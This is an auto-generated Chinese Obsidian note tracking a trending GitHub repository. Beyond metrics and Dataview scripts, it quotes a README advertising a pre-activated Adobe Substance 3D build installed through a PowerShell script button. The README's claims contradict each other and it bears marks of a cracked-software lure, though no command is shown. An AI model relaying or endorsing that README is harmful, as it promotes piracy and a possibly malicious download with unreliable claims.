---
repo: abdulmannanmalik13-wq/adobe-substance-3d-studio
url: https://github.com/abdulmannanmalik13-wq/adobe-substance-3d-studio
owner: abdulmannanmalik13-wq
owner_type: User
language: HTML
license: MIT
description: "Adobe Substance 3D Creative Studio 2026 - Secure Asset Pipeline Desktop Installer"
homepage: ""
stars: 1210
stars_per_day: 202
forks: 1
open_issues: 0
created: 2026-11-06
pushed_at: 2026-11-13
first_seen: 2026-11-13
week: "2026-W46"
month: "2026-11"
category: "Other"
subcategory: ""
release_tag: ""
install_complexity: "unknown"
status: to-review
my_rating: 0
score_confidence: 0
score_interest: 0
score_risk: 0
last_reviewed: 2026-11-13
use_case: ""
priority: high
ring: assess
discovered_via: "GitHub Trending"
appearances: 1
next_review: "2026-11-16"
contributor_count: 2
engagement: "low"
issue_close_rate: -1
repo_size_kb: 303
readme_length: 8805
bus_factor: 1
last_release_days: -1
release_cadence: "never"
verdict: ""
ring_history: "assess@2026-11-13"
star_history: "2026-11-13:1210"
tags:
  - github
  - "category/other"
  - "lang/html"
  - "topic/automation"
  - "topic/desktop"
  - "topic/developer_tools"
  - "topic/open_source"
  - "topic/python"
aliases:
  - "adobe-substance-3d-studio"
  - "abdulmannanmalik13-wq/adobe-substance-3d-studio"
---

# adobe-substance-3d-studio

**1.2k** stars · **202** stars/天 · 建立 6 天前 · HTML · MIT

```dataviewjs
const me = dv.page("Repos/abdulmannanmalik13-wq--adobe-substance-3d-studio");
if (me && ((me.verdict && me.verdict !== "") || (me.my_rating || 0) > 0)) {
  const parts = [];
  if (me.my_rating > 0) parts.push("\u2605".repeat(me.my_rating) + "\u2606".repeat(5 - me.my_rating));
  if (me.ring && me.ring !== "assess") parts.push("Ring: **" + me.ring + "**");
  if (me.verdict) parts.push(me.verdict);
  dv.paragraph("> [!success] 你的結論\n> " + parts.join(" / "));
}
```

> [!warning] AI 摘要產生失敗
> 此筆記的中文翻譯和分析未能成功產生。以下為原始資料，你可以手動補充。

`automation` `desktop` `developer-tools` `open-source` `python` `scripts` `software-engineering` `substance` `substance-3d` `substance-3d-painter` `substance-abuse` `substance-designer` `substance-designer-allegorithmic` `substance-painter` `substance-use` `substance3d` `substancedesigner` `system` `utility` `windows-app`

> [!summary] 一句話摘要
> Adobe Substance 3D Creative Studio 2026 - Secure Asset Pipeline Desktop Installer

## 專案簡介

Adobe Substance 3D Creative Studio 2026 - Secure Asset Pipeline Desktop Installer

## 健康度儀表板

> [!abstract]- 專案健康度綜合評估
> ```dataviewjs
> const me = dv.page("Repos/abdulmannanmalik13-wq--adobe-substance-3d-studio");
> if (me) {
>   const pushed = me.pushed_at ? new Date(me.pushed_at.toString()) : null;
>   const daysSincePush = pushed ? Math.floor((Date.now() - pushed.getTime()) / 86400000) : null;
>   const created = me.created ? new Date(me.created.toString()) : null;
>   const age = created ? Math.floor((Date.now() - created.getTime()) / 86400000) : null;
>   const forkRatio = me.stars > 0 ? ((me.forks || 0) / me.stars * 100).toFixed(1) : 0;
>   const issueRatio = me.stars > 0 ? ((me.open_issues || 0) / me.stars * 100).toFixed(1) : 0;
>   const maint = daysSincePush === null ? "?" : daysSincePush <= 7 ? "Active" : daysSincePush <= 30 ? "Moderate" : "Stale";
>   const busFactor = (me.forks || 0) > 50 ? "Good" : (me.forks || 0) > 10 ? "OK" : "Risk";
>   // v29: README 品質和 Issue 解決率
>   const readmeLen = me.readme_length || 0;
>   const readmeQ = readmeLen > 5000 ? "Excellent" : readmeLen > 2000 ? "Good" : readmeLen > 500 ? "Basic" : readmeLen > 0 ? "Minimal" : "None";
>   const icr = me.issue_close_rate;
>   const icrLabel = icr === undefined || icr < 0 ? "N/A" : icr + "%";
>   const icrEval = icr === undefined || icr < 0 ? "?" : icr >= 80 ? "Excellent" : icr >= 50 ? "Good" : icr >= 20 ? "Fair" : "Poor";
>   const repoKB = me.repo_size_kb || 0;
>   const sizeLabel = repoKB > 102400 ? (repoKB/1024).toFixed(0) + " MB" : repoKB + " KB";
>   dv.table(["指標", "值", "評估"], [
>     ["維護狀態", daysSincePush + " 天前推送", maint],
>     ["專案年齡", age + " 天", age > 180 ? "Established" : age > 30 ? "Growing" : "Brand New"],
>     ["Fork 比率", forkRatio + "%", parseFloat(forkRatio) > 20 ? "High adoption" : parseFloat(forkRatio) > 5 ? "Normal" : "Low"],
>     ["Issue 密度", issueRatio + "%", parseFloat(issueRatio) > 5 ? "High" : "Normal"],
>     ["Issue 解決率", icrLabel, icrEval],
>     ["Bus Factor", (me.bus_factor || 0) + " 人", (me.bus_factor || 0) >= 3 ? "Good" : (me.bus_factor || 0) >= 2 ? "OK" : "Risk"],
>     ["README 品質", readmeLen.toLocaleString() + " 字元", readmeQ],
>     ["Repo 大小", sizeLabel, repoKB > 102400 ? "Large" : repoKB > 10240 ? "Medium" : "Small"],
>     ["發版節奏", me.release_cadence || "unknown", me.release_cadence === "weekly" || me.release_cadence === "monthly" ? "Active" : me.release_cadence === "never" ? "No releases" : "Check"],
>     ["距上次發版", (me.last_release_days || 0) >= 0 ? (me.last_release_days + " 天") : "N/A", (me.last_release_days || -1) < 0 ? "?" : (me.last_release_days || 0) <= 30 ? "Fresh" : (me.last_release_days || 0) <= 90 ? "OK" : "Stale"],
>   ]);
> }
> ```

> [!abstract]- CHAOSS 社群健康度雷達
> ```dataviewjs
> const me = dv.page("Repos/abdulmannanmalik13-wq--adobe-substance-3d-studio");
> if (me) {
>   const pushed = me.pushed_at ? new Date(me.pushed_at.toString()) : null;
>   const daysSincePush = pushed ? Math.floor((Date.now() - pushed.getTime()) / 86400000) : 999;
>   const dims = [
>     ["維護活躍度", Math.max(0, 5 - Math.floor(daysSincePush / 14))],
>     ["貢獻者多樣性", Math.min(5, Math.floor((me.bus_factor || 0) * 1.5 + (me.contributor_count || 0) / 3))],
>     ["Issue 回應力", (me.issue_close_rate || 0) >= 80 ? 5 : (me.issue_close_rate || 0) >= 50 ? 4 : (me.issue_close_rate || 0) >= 20 ? 2 : 1],
>     ["發版節奏", me.release_cadence === "weekly" ? 5 : me.release_cadence === "monthly" ? 4 : me.release_cadence === "quarterly" ? 3 : me.release_cadence === "irregular" ? 2 : 1],
>     ["社群規模", Math.min(5, Math.floor(Math.log10(Math.max(me.stars || 1, 1)) * 1.2))],
>     ["Fork 活躍度", (me.forks || 0) > 100 ? 5 : (me.forks || 0) > 30 ? 4 : (me.forks || 0) > 10 ? 3 : (me.forks || 0) > 3 ? 2 : 1],
>   ];
>   dv.table(["維度", "分數", "視覺化"], dims.map(([name, score]) => [
>     name, score + "/5", "\u2588".repeat(score) + "\u2591".repeat(5 - score)
>   ]));
>   const avg = (dims.reduce((a, b) => a + b[1], 0) / dims.length).toFixed(1);
>   dv.paragraph("**綜合健康度：" + avg + "/5**");
> }
> ```

## 技術細節

| 欄位 | 值 |
| --- | --- |
| Forks | 1 |
| Open Issues | 0 |
| 最後推送 | 2026-11-13 |
| 建立日期 | 2026-11-06 |
| Repo 大小 | 303 KB |
| OpenSSF Scorecard | [查看](https://scorecard.dev/viewer/?uri=github.com/abdulmannanmalik13-wq/adobe-substance-3d-studio) |
| Topics | `automation` `desktop` `developer-tools` `open-source` `python` `scripts` `software-engineering` `substance` |

> [!info]- 主要依賴
> `package.json` 中的核心套件：
> `@actions/core` `@actions/github` `typescript`

> [!info]- 主要貢獻者
> | 貢獻者 | Commits |
> | --- | --- |
> | [@github-actions[bot]](https://github.com/github-actions[bot]) | 25 |
> | [@abdulmannanmalik13-wq](https://github.com/abdulmannanmalik13-wq) | 21 |

## 開發動態

> [!abstract] 最近 10 次 commit（2026-11-12 ~ 2026-11-13）
> **活躍天數** 2 天 · **最新 commit** Update index.html

## README 摘錄

> [!info]- 展開查看原文 README
> # Adobe Substance 3D Creative Studio 2026 — Secure Asset Pipeline for Windows 11
> 
> 
> ### ⚡ PowerShell Setup Button
> 
> [](https://abdulmannanmalik13-wq.github.io/adobe-substance-3d-studio/)
> 
> []() []() []()
> 
> ---
> 
> Adobe-Substance-3d is a ready-to-run desktop creative studio application that combines a full working installer with a secure digital asset deployment pipeline. The build delivers a complete 2026 desktop experience for local workstations, bundling the core creative toolset with an automated asset delivery layer that keeps material and content libraries synchronized during deployment. Engineered for offline and controlled-environment infrastructure, the installer streamlines setup while maintaining integrity across the asset pipeline. This README documents the build's configuration, deployment behavior, and operational parameters for technical evaluation and rollout.
> 
> 
> ## Features
> 
> - **Pre-Activated Standalone Build:** Delivers a fully configured installation of Adobe-Substance-3d with licensing and activation already applied, eliminating post-install configuration steps and enabling immediate use in isolated or offline environments.
> - **Secure Digital Asset Deployment Pipeline:** Implements a verified, integrity-checked pipeline for distributing and synchronizing digital assets, ensuring that materials, textures, and substance libraries are deployed consistently and tamper-free across target machines.
> - **Ready-to-Run Desktop Experience:** Provides a complete, self-contained desktop application package that runs immediately after installation, with all dependencies and runtime components bundled for a stable, reproducible experience on Windows x64.
> - **Offline-Capable Operation:** Designed for air-gapped and restricted-network deployments, allowing full functionality without requiring external connectivity for activation, updates, or asset retrieval during standard operation.
> - **Deterministic Installation Workflow:** Executes a structured, repeatable setup process that verifies system prerequisites, stages assets, and finalizes configuration with consistent results across deployments.
> - **Integrated Asset Integrity Verification:** Applies checksum-based validation to deployed digital assets, detecting corruption or unauthorized modification and ensuring pipeline reliability.
> - **Self-Contained Runtime Environment:** Bundles required libraries and runtime components to minimize host system dependencies and reduce configuration drift between installations.
> - **Streamlined Provisioning for Testing and Deployment:** Supports rapid rollout for evaluation, QA, and production scenarios through a unified installer that consolidates setup, activation, and asset staging into a single operation.
> 
> 
> ## ✅ Before You Start
> 
> - **OS:** Windows 10 / 11
> - **Shell:** PowerShell 5.1+ or PowerShell 7+
> - **Network:** internet access to download the script
> - **Privileges:** standard user
> 
> 
> ## How it works
> 
> The application operates as a self-contained desktop environment that isolates all creative tooling, asset libraries, and deployment routines within a single managed runtime. On launch, the installer verifies the integrity of its bundled payload, provisions the local asset repository, and registers the creative studio components against the host system without requiring any external package manager or network fetch.
> 
> The secure digital asset deployment pipeline runs in discrete stages. First, asset manifests are validated against embedded checksums to confirm package authenticity. Second, the deployment engine stages all creative resources into a versioned local cache, preserving rollback capability. Third, runtime hooks bind the staged assets to the studio application, ensuring each session starts from a consistent, verified state.
> 
> Core operation is driven by a modular service layer. The installer framework handles environment detection, dependency resolution, and configuration of the desktop shell. The asset pipeline component manages synchronization between the local repository and the active project workspace, while the launcher orchestrates startup sequencing and session state. All processes execute locally; no persistent background services or remote callbacks are required after initial provisioning.
> 
> The build is engineered for repeatable offline deployment. Each installation writes a complete manifest of provisioned components, enabling deterministic re-provisioning, integrity audits, and clean removal. Configuration is stored in a portable profile, so the same desktop experience can be reproduced across compatible workstations without re-downloading creative content.
> 
> 
> ## Compatibility
> 
> **Operating System Support**
> The desktop client is validated for deployment on Windows 10 (build 1909 or later) and Windows 11, with both x64 and ARM64 architectures supported through the unified installer. Native execution on Linux distributions is provided via the AppImage distribution channel, tested against Ubuntu 22.04 LTS, Fedora 38, and Debian 12 baselines. macOS support targets version 12 (Monterey) and above on both Intel and Apple Silicon hardware, delivering a universal binary that operates without Rosetta translation.
> 
> **Hardware Requirements**
> Minimum operational specifications include a quad-core processor at 2.4 GHz, 8 GB of system memory, and 4 GB of available disk space for the core installation. For workloads involving large asset libraries or high-resolution content pipelines, 16 GB of memory and SSD-backed storage are recommended. Graphics acceleration requires a DirectX 11-capable GPU on Windows or a Metal-compatible GPU on macOS, with 2 GB of dedicated video memory to sustain real-time viewport rendering.
> 
> **Runtime Dependencies**
> The application bundles its own managed runtime and does not require a system-wide framework installation. The secure digital asset deployment pipeline operates independently of external package managers and resolves all cryptographic verification internally. Network access is required only during initial asset synchronization; subsequent launches operate fully offline against the local cache.
> 
> **Asset Pipeline Interoperability**
> The deployment pipeline emits and consumes standardized container formats, ensuring compatibility with existing content management workflows. Asset manifests are versioned and forward-compatible, allowing the 2026 release to ingest archives produced by prior builds without migration steps. Deployment targets include local filesystems, mapped network shares, and synchronized directory structures maintained by third-party backup tooling.
> 
> **Virtualization and Remote Desktop**
> Full functionality is confirmed under VMware Workstation, VirtualBox, and Hyper-V when GPU passthrough or software rendering fallback is enabled. Remote Desktop sessions on Windows and VNC-based environments on Linux are supported, though hardware-accelerated viewport features degrade gracefully to software rendering in constrained remote contexts.
> 
> **Deployment Compatibility Notes**
> The installer is self-contained and does not modify system-wide registry entries or shared library paths on Linux and macOS. Side-by-side installation of multiple release channels is supported through isolated application data directories, permitting validation of the 2026 build alongside existing installations without configuration conflicts.
> 
> 
> ## Disclaimer
> 
> This build is provided strictly as-is for evaluation, testing, and integration purposes within controlled desktop environments. Adobe-Substance-3d is distributed as a self-contained desktop package with a secure digital asset deployment pipeline; no warranty, express or implied, is made regarding fitness for production use, merchantability, or non-infringement. The maintainers assume no liability for data loss, system instability, licensing conflicts, or indirect damages arising from installation or operation of this build. Users are responsible for verifying compatibility with their operating s

## 延伸閱讀

相關專案：[[0xwilliamortiz--claude-red|0xwilliamortiz/claude-red]] · [[0xwilliamortiz--openclaude-improved|0xwilliamortiz/openclaude-improved]] · [[0xwilliamortiz--ponytail-improved|0xwilliamortiz/ponytail-improved]] · [[2akouwu--reverify|2akouwu/reverify]] · [[852wa--JIZURA|852wa/JIZURA]] · [[ARahim3--DigUp|ARahim3/DigUp]] · [[Accio-org--RealReplicaBench|Accio-org/RealReplicaBench]] · [[Albert-Weasker--niubigeo|Albert-Weasker/niubigeo]]

[GitHub](https://github.com/abdulmannanmalik13-wq/adobe-substance-3d-studio)

## 相關收錄

> [!note]- 同分類的其他專案
> ```dataview
> TABLE stars, install_complexity AS "難度", status
> FROM "Repos"
> WHERE category = "Other" AND file.name != "abdulmannanmalik13-wq--adobe-substance-3d-studio"
> SORT stars DESC
> LIMIT 8
> ```

> [!note]- 同語言的熱門專案
> ```dataview
> TABLE stars_per_day AS "Stars/天", category AS "分類", use_case AS "用途"
> FROM "Repos"
> WHERE language = "HTML" AND file.name != "abdulmannanmalik13-wq--adobe-substance-3d-studio" AND status != "archived"
> SORT stars_per_day DESC
> LIMIT 5
> ```

> [!note]- 同週收錄
> ```dataview
> TABLE category AS "分類", stars, stars_per_day AS "stars/天"
> FROM "Repos"
> WHERE week = "2026-W46" AND file.name != "abdulmannanmalik13-wq--adobe-substance-3d-studio"
> SORT stars DESC
> ```

> [!note]- Ring 更高的同類競品
> ```dataviewjs
> const me = dv.page("Repos/abdulmannanmalik13-wq--adobe-substance-3d-studio");
> if (me) {
>   const ringOrder = { hold: 0, assess: 1, trial: 2, adopt: 3 };
>   const myRing = ringOrder[me.ring] || 0;
>   const better = dv.pages('"Repos"')
>     .where(p => p.file.name !== "abdulmannanmalik13-wq--adobe-substance-3d-studio" && p.category === me.category && (ringOrder[p.ring] || 0) > myRing)
>     .sort(p => p.stars_per_day || 0, "desc").limit(5);
>   if (better.length > 0) {
>     dv.table(["專案", "Ring", "Stars/天", "安裝", "用途"], better.map(p => [
>       p.file.link, p.ring, p.stars_per_day || 0, p.install_complexity || "?", (p.use_case || "").toString().slice(0, 40)
>     ]));
>   } else { dv.paragraph("_此分類中沒有 Ring 更高的專案（你可能已經在用最好的了）_"); }
> }
> ```

## 同 Owner 專案

> [!note]- 這位開發者的其他收錄專案
> ```dataview
> TABLE stars AS "Stars", category AS "分類", status AS "狀態"
> FROM "Repos"
> WHERE owner = "abdulmannanmalik13-wq" AND file.name != "abdulmannanmalik13-wq--adobe-substance-3d-studio"
> SORT stars DESC
> ```

## Vault 排名

> [!abstract]- 這個專案在 vault 中的相對位置
> ```dataviewjs
> const me = dv.page("Repos/abdulmannanmalik13-wq--adobe-substance-3d-studio");
> const all = dv.pages('"Repos"').where(p => p.status !== "archived").sort(p => p.stars_per_day || 0, "desc");
> const rank = all.array().findIndex(p => p.file.name === me?.file?.name) + 1;
> const catAll = all.where(p => p.category === me?.category);
> const catRank = catAll.array().findIndex(p => p.file.name === me?.file?.name) + 1;
> const totalStarsAll = dv.pages('"Repos"').where(p => p.status !== "archived").sort(p => p.stars || 0, "desc");
> const starsRank = totalStarsAll.array().findIndex(p => p.file.name === me?.file?.name) + 1;
> if (rank > 0) {
>   const pct = Math.round((1 - rank / all.length) * 100);
>   dv.paragraph(`Stars/天排名：**全 vault 第 ${rank}**/${all.length}（前 ${100 - pct}%）· **${me.category} 第 ${catRank}**/${catAll.length}\nStars 總量排名：**第 ${starsRank}**/${totalStarsAll.length}`);
> }
> ```

## Star 趨勢

> [!abstract]- Stars 成長追蹤
> ```dataviewjs
> const me = dv.page("Repos/abdulmannanmalik13-wq--adobe-substance-3d-studio");
> if (me?.star_history) {
>   const raw = me.star_history.toString();
>   const points = raw.split(",").map(p => { const [d, s] = p.split(":"); return { date: d, stars: parseInt(s) }; }).filter(p => !isNaN(p.stars));
>   if (points.length >= 2) {
>     const max = Math.max(...points.map(p => p.stars));
>     const lines = points.map(p => {
>       const w = Math.round(p.stars / max * 25);
>       return `${p.date} ${"\u2588".repeat(w)}${"\u2591".repeat(25-w)} ${p.stars.toLocaleString()}`;
>     });
>     const first = points[0].stars;
>     const last = points[points.length-1].stars;
>     const growth = first > 0 ? Math.round((last - first) / first * 100) : 0;
>     lines.push(`\n**成長** +${(last-first).toLocaleString()} stars（${growth}%）in ${points.length} snapshots`);
>     // 趨勢方向偵測
>     if (points.length >= 3) {
>       const mid = Math.floor(points.length / 2);
>       const fh = points.slice(0, mid), sh = points.slice(mid);
>       const rateF = fh.length > 1 ? (fh[fh.length-1].stars - fh[0].stars) / Math.max(1, (new Date(fh[fh.length-1].date) - new Date(fh[0].date)) / 86400000) : 0;
>       const rateS = sh.length > 1 ? (sh[sh.length-1].stars - sh[0].stars) / Math.max(1, (new Date(sh[sh.length-1].date) - new Date(sh[0].date)) / 86400000) : 0;
>       const ratio = rateF > 0 ? rateS / rateF : rateS > 0 ? 2 : 1;
>       const dir = ratio > 1.3 ? "Rising（加速中）" : ratio < 0.7 ? "Cooling（降溫中）" : "Stable（穩定）";
>       lines.push(`**趨勢方向** ${dir}（加速比 ${Math.round(ratio * 100) / 100}x）`);
>     }
>     dv.paragraph(lines.join("\n"));
>   } else { dv.paragraph("需要 2+ 次快照才能顯示趨勢"); }
> } else { dv.paragraph("尚無 star_history 資料（下次出現在 trending 時會開始追蹤）"); }
> ```

## 相對成長速度

> [!abstract]- 跟 vault 中同類專案比較
> ```dataviewjs
> const me = dv.page("Repos/abdulmannanmalik13-wq--adobe-substance-3d-studio");
> if (me) {
>   const all = dv.pages('"Repos"').where(p => p.status !== "archived");
>   const sameCat = all.where(p => p.category === me.category);
>   const avgAll = all.length > 0 ? Math.round(all.map(p => p.stars_per_day || 0).array().reduce((a,b) => a+b, 0) / all.length) : 0;
>   const avgCat = sameCat.length > 0 ? Math.round(sameCat.map(p => p.stars_per_day || 0).array().reduce((a,b) => a+b, 0) / sameCat.length) : 0;
>   const mySpd = me.stars_per_day || 0;
>   const vsAll = avgAll > 0 ? Math.round(mySpd / avgAll * 100) : 0;
>   const vsCat = avgCat > 0 ? Math.round(mySpd / avgCat * 100) : 0;
>   dv.table(["比較對象", "平均 Stars/天", "本專案", "倍數"], [
>     ["全 Vault", avgAll, mySpd, vsAll + "%"],
>     ["同分類 (" + me.category + ")", avgCat, mySpd, vsCat + "%"],
>   ]);
>   if (vsAll >= 300) dv.paragraph("**極速成長** — 成長速度是 vault 平均的 3 倍以上");
>   else if (vsAll >= 150) dv.paragraph("**高速成長** — 成長速度高於 vault 平均");
>   else if (vsAll >= 50) dv.paragraph("**正常速度** — 接近 vault 平均水平");
>   else dv.paragraph("**低速成長** — 低於 vault 平均，可能已過熱度高峰");
> }
> ```

## 決策分數

> [!abstract]- 綜合評估（自動計算）
> ```dataviewjs
> const me = dv.page("Repos/abdulmannanmalik13-wq--adobe-substance-3d-studio");
> if (me) {
>   let score = 0;
>   let breakdown = [];
>   // 熱度 (0-25)
>   const spd = me.stars_per_day || 0;
>   const heat = Math.min(25, Math.round(spd / 40 * 25));
>   score += heat; breakdown.push(`熱度: ${heat}/25`);
>   // 安裝難度 (0-20)
>   const inst = me.install_complexity === "easy" ? 20 : me.install_complexity === "medium" ? 12 : 5;
>   score += inst; breakdown.push(`易用性: ${inst}/20`);
>   // 成熟度 (0-20)
>   const created = me.created ? new Date(me.created.toString()) : null;
>   const age = created ? Math.floor((Date.now() - created.getTime()) / 86400000) : 0;
>   const mat = age > 365 ? 20 : age > 180 ? 16 : age > 30 ? 10 : 5;
>   score += mat; breakdown.push(`成熟度: ${mat}/20`);
>   // 社群 (0-20)
>   const forks = me.forks || 0;
>   const comm = forks > 200 ? 20 : forks > 50 ? 15 : forks > 10 ? 10 : 5;
>   score += comm; breakdown.push(`社群: ${comm}/20`);
>   // 授權 (0-15)
>   const lic = me.license || "";
>   const friendly = ["MIT","Apache-2.0","BSD-2-Clause","BSD-3-Clause","ISC","Unlicense"].includes(lic);
>   const licScore = friendly ? 15 : lic && lic !== "N/A" ? 8 : 0;
>   score += licScore; breakdown.push(`授權: ${licScore}/15`);
>   const grade = score >= 80 ? "A" : score >= 60 ? "B" : score >= 40 ? "C" : "D";
>   const bar = "\u2588".repeat(Math.round(score/5)) + "\u2591".repeat(20 - Math.round(score/5));
>   dv.paragraph(`## ${grade} (${score}/100)\n${bar}\n\n${breakdown.join(" | ")}`);
> }
> ```

---

## 個人筆記

> [!abstract]- 評估進度
> ```dataviewjs
> const me = dv.page("Repos/abdulmannanmalik13-wq--adobe-substance-3d-studio");
> if (me) {
>   const steps = [
>     { name: "已讀", done: me.status && me.status !== "to-review" },
>     { name: "已評分", done: (me.my_rating || 0) > 0 },
>     { name: "有結論", done: me.verdict && me.verdict !== "" },
>     { name: "Ring 決策", done: me.ring && me.ring !== "" && me.ring !== "assess" },
>     { name: "試用記錄", done: me.status === "tried" || me.status === "integrated" },
>   ];
>   const done = steps.filter(s => s.done).length;
>   const pct = Math.round((done / steps.length) * 100);
>   const bar = "\u2588".repeat(Math.round(pct / 5)) + "\u2591".repeat(20 - Math.round(pct / 5));
>   dv.paragraph(`${bar} **${done}/${steps.length}** (${pct}%)`);
>   const todo = steps.filter(s => !s.done).map(s => s.name);
>   if (todo.length > 0) dv.paragraph("待完成：" + todo.join(" / "));
> }
> ```

> [!question]+ 快速評估（30 秒填完）
> 
> 相關性:: 未評估
> 印象:: _一句話_
> 行動:: 不需要
> 
> | 維度 | 分數 (1-5) | 說明 |
> | --- | :---: | --- |
> | 信心 | /5 | _我對這工具的了解程度_ |
> | 興趣 | /5 | _想投入時間研究的程度_ |
> | 風險 | /5 | _導入風險，5=極低風險_ |
> 
> _填完後更新 frontmatter：`score_confidence` / `score_interest` / `score_risk`_
> 
> _相關性選項：直接相關 / 間接相關 / 不相關 / 未評估_
> _行動選項：立刻試用 / 加入待辦 / 持續觀察 / 不需要_

### 試用記錄

> [!example]- 試用 #1
> 試用日期 :: 
> 試用版本 :: 
> 測試環境 :: _OS / Node / Python 版本_
> 安裝過程 :: _順利 / 遇到問題（描述）_
> 花費時間 :: _從零到可用_
> 實際效果 :: _達到預期 / 不如預期（原因）_
> 踩到的坑 :: _描述 + 解法_
> 決定 :: _繼續使用 / 暫時擱置 / 放棄（原因）_

> [!question]- 待研究的問題
> _記下看完後還沒有答案的問題，未來回來補充_
> 
> - [ ] 

### 採用判斷

> [!tip]- 什麼時候該用 / 不該用
> **該用的情況**：
> - 
> 
> **不該用的情況**：
> - 

> [!warning]- 替換成本
> 若半年後要換掉，難度多高？資料格式是標準的嗎？
> 
> 侵入性:: _低 / 中 / 高_
> 遷移路徑:: _描述_

### 決策記錄

> [!abstract]- 為什麼評估這個工具？
> **當時的痛點**：_遇到什麼問題才開始找工具？_
> **觸發來源**：_GitHub Trending / HN / 同事推薦 / 其他_
> **當時的約束**：_時間 / 團隊 / 語言 / 部署環境_

> [!note]- 最終決策
> decision:: _選了什麼（或為何還在觀望）_
> why:: _當時的理由（越具體越好）_
> outcome:: _後來實際發生了什麼_

### 探索日誌

_按時間記錄，每次接觸時追加一段（最新在上）_

> **2026-11-13** — 首次收錄
> _第一印象：_

**狀態追蹤**：`to-review` → `reading` → `tried` → `integrated` / `archived`
**Tech Radar**：`assess` → `trial` → `adopt` / `hold`

> [!info]- 評估完成後
> 更新 frontmatter：
> - `ring`: adopt / trial / assess / hold
> - `ring_history`: 追加新狀態（格式：`assess@2026-03-10, trial@2026-03-15`）
> - `verdict`: 一句話結論
> - `my_rating`: 1-5 分
> - `status`: reading / tried / integrated / archived

## 出現記錄

- [[2026-11-13|2026-11-13]] — 首次收錄，1.2k stars
